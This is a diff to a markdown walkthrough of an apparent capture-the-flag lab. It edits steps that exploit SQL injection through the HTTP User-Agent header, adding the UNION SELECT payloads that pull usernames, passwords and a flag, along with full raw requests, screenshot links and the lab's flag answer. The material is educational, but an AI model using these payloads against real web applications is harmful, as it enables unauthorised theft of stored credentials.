@@ -113,16 +113,25 @@ Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 ```
 
+<img width="1281" height="698" alt="Screenshot 2026-08-29 at 12 53 52 AM" src="https://github.com/user-attachments/assets/26a49a28-3ca2-4469-9332-4d30288b51ac" />
+
+
+
 ---
 
 ### Step 4 — Change the User-Agent Field by following to check the vulnerability to retrieve username and password:
 
 The Command:
 
+```
+' UNION SELECT username, password FROM user; #
+```
+
+
 ```json
 GET /httpagent/ HTTP/1.1
 Host: 10.48.142.24
-User-Agent: **' UNION SELECT username, password FROM user; #**
+User-Agent: ' UNION SELECT username, password FROM user; #
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
@@ -130,6 +139,10 @@ Connection: keep-alive
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 ```
+
+<img width="1279" height="685" alt="Screenshot 2026-08-29 at 12 35 09 AM" src="https://github.com/user-attachments/assets/0293a844-2007-4360-95f2-d7f6947b1ec4" />
+
+
 
 ---
 
@@ -137,10 +150,14 @@ Priority: u=0, i
 
 The Command:
 
+```
+' UNION SELECT book_id, flag FROM books; #
+```
+
 ```json
 GET /httpagent/ HTTP/1.1
 Host: 10.48.142.24
-User-Agent: **' UNION SELECT book_id, flag FROM books; #** 
+User-Agent: ' UNION SELECT book_id, flag FROM books; #
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
@@ -148,6 +165,10 @@ Connection: keep-alive
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 ```
+
+<img width="1275" height="714" alt="Screenshot 2026-08-29 at 12 30 50 AM" src="https://github.com/user-attachments/assets/4aeafbff-9a56-41ed-9abb-678b9a8eff40" />
+
+
 
 ---
 
@@ -157,11 +178,6 @@ Priority: u=0, i
 THM{HELLO}
 ```
 
-### Question 1 Answer
-
-```
-THM{HELLO}
-```
 
 ---
 
